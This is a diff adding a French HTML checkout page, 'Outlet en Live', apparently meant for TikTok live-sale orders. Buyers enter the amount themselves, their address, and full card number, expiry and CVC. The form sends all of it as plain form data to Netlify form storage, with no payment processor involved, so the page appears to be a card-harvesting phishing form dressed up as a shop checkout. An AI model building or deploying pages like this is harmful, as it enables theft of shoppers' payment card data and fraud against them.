@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Outlet en Live</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root{
+    --bg: #eceae2;
+    --field-bg: #ffffff;
+    --text: #1b1b2b;
+    --muted: #9a9a9a;
+    --placeholder: #b4b4b4;
+    --brown: #96835e;
+    --shadow: 0 2px 10px rgba(0,0,0,0.05);
+    --radius: 14px;
+  }
+
+  html{ -webkit-text-size-adjust:100%; }
+
+  body{
+    font-family: 'Poppins', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    padding: 36px 20px 80px;
+  }
+
+  .wrap{ max-width: 1180px; margin: 0 auto; }
+
+  .hidden-field{
+    position:absolute !important;
+    left:-9999px;
+    width:1px; height:1px;
+    overflow:hidden;
+  }
+
+  /* ---------- Logo ---------- */
+  .logo{ text-align: center; margin-bottom: 34px; }
+  .logo .mark{
+    font-family: 'Dancing Script', cursive;
+    font-size: 72px;
+    font-weight: 700;
+    color: #0c0c0c;
+    line-height: 1;
+    position: relative;
+    display: inline-block;
+    letter-spacing: 1px;
+  }
+  .logo .sub{
+    display:block;
+    font-family: 'Poppins', sans-serif;
+    font-weight: 600;
+    font-size: 11px;
+    letter-spacing: 6px;
+    margin-top: -6px;
+    margin-left: 40px;
+  }
+  .logo .sub .dot{ color:#ff4500; }
+  .logo img{ width:240px; max-width:70%; height:auto; display:inline-block; }
+
+  /* ---------- Layout ---------- */
+  .grid{
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 44px;
+    align-items: start;
+  }
+  .col-left{ max-width: 540px; }
+
+  /* ---------- Headings ---------- */
+  h2.section{
+    font-size: 28px;
+    font-weight: 800;
+    margin: 0 0 20px;
+    letter-spacing: .3px;
+  }
+  .section-gap{ margin-top: 40px; }
+
+  /* ---------- Fields ---------- */
+  .field{
+    width: 100%;
+    background: var(--field-bg);
+    border: none;
+    border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    padding: 20px 22px;
+    font-family: 'Poppins', sans-serif;
+    font-size: 15px;
+    color: var(--text);
+    margin-bottom: 16px;
+    outline: none;
+    transition: box-shadow .15s ease;
+  }
+  .field::placeholder{ color: var(--placeholder); }
+  .field:focus{ box-shadow: 0 0 0 2px rgba(0,0,0,0.12), var(--shadow); }
+
+  .field-wrap{ position: relative; }
+  .field-wrap .suffix{
+    position:absolute;
+    right: 22px; top: 50%;
+    transform: translateY(-50%);
+    margin-top: -8px;
+    color: var(--text);
+    font-size: 15px;
+    pointer-events:none;
+  }
+
+  .row2{ display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+
+  /* Country select */
+  .select-wrap{ position: relative; margin-bottom: 16px; }
+  .select-wrap label{
+    position:absolute; top: 9px; left: 22px;
+    font-size: 11px; color: var(--muted);
+  }
+  select.field{
+    appearance:none; -webkit-appearance:none;
+    padding-top: 26px; padding-bottom: 12px;
+    margin-bottom: 0; cursor: pointer;
+    color:#1a2a6c;
+  }
+  .select-wrap .chev{
+    position:absolute; right: 22px; top: 50%;
+    transform: translateY(-50%); pointer-events:none; color:#555;
+  }
+
+  /* ---------- Option cards ---------- */
+  .opt-card{
+    background: var(--field-bg);
+    border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    padding: 24px 24px;
+  }
+  .opt-head{ display:flex; align-items:center; justify-content: space-between; }
+  .opt-left{ display:flex; align-items:center; gap: 14px; }
+  .opt-title{ font-weight: 700; font-size: 17px; }
+  .opt-right{ font-weight: 700; font-size: 16px; }
+  .opt-desc{
+    color: var(--brown);
+    font-size: 14px;
+    line-height: 1.5;
+    margin-top: 14px;
+    padding-left: 34px;
+  }
+  .opt-desc + .opt-desc{ margin-top: 10px; }
+
+  /* Radio */
+  .radio{
+    width: 20px; height: 20px;
+    border-radius: 50%;
+    border: 2px solid #111;
+    display:inline-flex; align-items:center; justify-content:center;
+    flex: 0 0 auto;
+  }
+  .radio.checked::after{
+    content:""; width: 10px; height: 10px;
+    border-radius:50%; background:#111;
+  }
+
+  /* payment method */
+  .intro-row{ display:flex; align-items:center; gap: 14px; margin-bottom: 16px; }
+  .intro-row .label{ font-weight:700; font-size:17px; }
+  .cards-ico{ display:flex; gap:4px; }
+  .cards-ico img{ height: 34px; width:auto; border-radius:4px; }
+
+  .card-secure{
+    width:100%;
+    background:#fffbe6;
+    border:1px solid #f3e39a;
+    border-radius:10px;
+    height:30px;
+    margin-bottom:16px;
+  }
+
+  /* terms */
+  .terms{
+    display:flex; align-items:flex-start; gap: 10px;
+    margin-top: 24px; font-size: 14px; line-height: 1.45;
+  }
+  .terms input{
+    width: 18px; height: 18px; accent-color:#111;
+    margin-top: 2px; flex: 0 0 auto;
+  }
+
+  /* footer links */
+  .foot-links{ margin-top: 28px; font-size: 14px; line-height: 1.9; }
+  .foot-links a{ color: var(--text); text-decoration:none; }
+  .foot-links a:hover{ text-decoration: underline; }
+  .foot-links .sep{ margin: 0 10px; }
+  .foot-note{ margin-top: 18px; font-size: 14px; color: var(--text); line-height: 1.5; }
+
+  /* ---------- Right column ---------- */
+  .top-btn-wrap{ display:flex; justify-content:flex-end; margin-bottom: 20px; }
+  .btn-dist{
+    background:#0c0c0c; color:#fff; border:none; border-radius: 10px;
+    padding: 14px 22px; font-family:'Poppins',sans-serif;
+    font-weight:700; font-size: 12px; letter-spacing:.5px; cursor:pointer;
+  }
+  .btn-link{ display:inline-block; text-decoration:none; }
+
+  .summary{
+    background:#fff; border-radius: 16px; box-shadow: var(--shadow);
+    padding: 28px 30px;
+  }
+  .summary h3{ font-size: 23px; font-weight: 800; margin-bottom: 18px; }
+  .sum-row{ display:flex; justify-content:space-between; padding: 11px 0; font-size: 15px; }
+  .sum-row.total{ border-top: 1px solid #ececec; font-weight:700; margin-top: 4px; padding-top: 16px; }
+
+  .btn-confirm{
+    width:100%; margin-top: 22px;
+    background:#6f6f63; color:#fff; border:none; border-radius: 12px;
+    padding: 20px; font-family:'Poppins',sans-serif;
+    font-weight:700; font-size: 15px; letter-spacing:.5px;
+    cursor:pointer; transition: background .15s ease;
+  }
+  .btn-confirm:hover{ background:#5d5d52; }
+  /* ---------- Responsive ---------- */
+  @media (max-width: 880px){
+    .grid{ grid-template-columns: 1fr; gap: 30px; }
+    .col-left{ max-width: none; }
+    .logo .mark{ font-size: 56px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- Logo -->
+  <div class="logo">
+    <img src="logo.png" alt="Outlet en Live" width="900" height="380">
+  </div>
+
+  <!-- =================== NETLIFY FORM =================== -->
+  <form name="outlet-order"
+        method="POST"
+        data-netlify="true"
+        data-netlify-honeypot="bot-field"
+        action="/merci.html">
+
+    <input type="hidden" name="form-name" value="outlet-order">
+    <p class="hidden-field">
+      <label>Ne pas remplir ce champ : <input name="bot-field"></label>
+    </p>
+
+    <div class="grid">
+
+      <!-- ============ LEFT ============ -->
+      <div class="col-left">
+
+        <h2 class="section">Montant total</h2>
+
+        <div class="field-wrap">
+          <input class="field" type="number" step="0.01" min="0" id="amount" name="total_amount" placeholder="Montant">
+          <span class="suffix">€</span>
+        </div>
+
+        <input class="field" type="text" name="order_reference" placeholder="Référence de commande">
+        <input class="field" type="text" name="ordered_item" placeholder="Article commandé (facultatif)">
+        <input class="field" type="text" name="tiktok_username" placeholder="Nom d’utilisateur TikTok">
+        <input class="field" type="email" name="email" placeholder="Adresse e-mail">
+
+        <div class="row2">
+          <input class="field" type="text" name="first_name" placeholder="Prénom">
+          <input class="field" type="text" name="last_name" placeholder="Nom">
+        </div>
+
+        <input class="field" type="text" name="address" placeholder="Adresse">
+        <input class="field" type="text" name="city" placeholder="Ville">
+        <input class="field" type="text" name="postal_code" placeholder="Code postal">
+
+        <div class="select-wrap">
+          <label>Pays</label>
+          <select class="field" name="country" id="country">
+            <option>France</option>
+            <option>Allemagne</option>
+            <option>Espagne</option>
+            <option>Italie</option>
+            <option>Portugal</option>
+            <option>Belgique</option>
+            <option>Pays-Bas</option>
+            <option>Luxembourg</option>
+            <option>Suisse</option>
+            <option>Autriche</option>
+            <option>Irlande</option>
+            <option>Royaume-Uni</option>
+            <option>Canada</option>
+            <option>Bénin</option>
+            <option>Côte d’Ivoire</option>
+            <option>Sénégal</option>
+            <option>Togo</option>
+          </select>
+          <span class="chev">&#9662;</span>
+        </div>
+
+        <input class="field" type="tel" name="phone" placeholder="Numéro de téléphone">
+
+        <!-- Shipping method -->
+        <h2 class="section section-gap">Mode de livraison</h2>
+        <div class="opt-card">
+          <div class="opt-head">
+            <div class="opt-left">
+              <span class="radio checked" aria-hidden="true"></span>
+              <span class="opt-title">Mondial Relay</span>
+            </div>
+            <span class="opt-right">5,00 € TTC</span>
+          </div>
+          <p class="opt-desc">Délai de livraison : 3 à 5 jours à partir de la mise à disposition du colis.</p>
+          <p class="opt-desc">🚚 Livraison offerte sur les prochaines commandes pendant le live</p>
+        </div>
+        <input type="hidden" name="shipping_method" value="Mondial Relay - 5,00 €">
+
+        <!-- Payment method -->
+        <h2 class="section section-gap">Mode de paiement</h2>
+
+        <div class="intro-row">
+          <span class="radio checked" aria-hidden="true"></span>
+          <span class="label">Payer par carte</span>
+          <span class="cards-ico">
+            <img src="cards.png" alt="CB, Mastercard, Visa">
+          </span>
+        </div>
+        <input type="hidden" name="payment_method" value="Carte bancaire">
+
+        <div class="card-secure"></div>
+
+        <input class="field" type="text" autocomplete="cc-name" placeholder="Nom du titulaire de la carte" name="cardholder_name">
+        <input class="field" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="Numéro de carte" name="card_number">
+
+        <div class="row2">
+          <input class="field" type="text" autocomplete="cc-exp" placeholder="Date d’expiration (MM/AA)" name="card_expiry">
+          <input class="field" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="Cryptogramme" name="card_cvc">
+        </div>
+
+        <label class="terms">
+          <input type="checkbox" name="agree_terms" value="yes" required>
+          <span>J’accepte les conditions de service et m’engage à les respecter sans réserve.</span>
+        </label>
+
+        <div class="foot-links">
+          <a href="#">Mentions légales</a><span class="sep"></span>
+          <a href="#">Conditions générales de vente</a><span class="sep"></span>
+          <a href="#">Politique de confidentialité</a><br>
+          <a href="#">Nous contacter</a>
+        </div>
+
+        <p class="foot-note">
+          Notre service client est joignable du lundi au vendredi, de 9 h à 17 h.
+        </p>
+
+      </div>
+
+      <!-- ============ RIGHT ============ -->
+      <div class="col-right">
+
+        <div class="top-btn-wrap">
+          <a href="track.html" class="btn-dist btn-link">SUIVRE MES COMMANDES</a>
+        </div>
+
+        <div class="summary">
+          <h3>Récapitulatif de la commande</h3>
+          <div class="sum-row"><span>Montant des articles</span><span>Montant indiqué ci-dessus</span></div>
+          <div class="sum-row"><span>Livraison</span><span>5,00 €</span></div>
+          <div class="sum-row total"><span>Total</span><span>Confirmé avant paiement</span></div>
+        </div>
+
+        <input type="hidden" name="delivery_fee" value="5.00 €">
+
+        <button type="submit" class="btn-confirm" id="confirm">CONFIRMER LA COMMANDE</button>
+
+      </div>
+
+    </div>
+  </form>
+
+</div>
+
+</body>
+</html>
